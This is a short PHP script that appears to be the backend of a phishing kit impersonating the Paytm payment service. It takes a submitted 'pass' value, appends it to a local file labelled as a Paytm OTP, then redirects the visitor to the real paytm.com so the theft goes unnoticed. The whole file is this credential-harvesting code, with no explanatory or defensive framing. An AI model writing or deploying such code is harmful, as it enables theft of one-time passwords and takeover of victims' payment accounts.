<?php
file_put_contents("otp.txt", "Paytm OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://paytm.com/');
?>
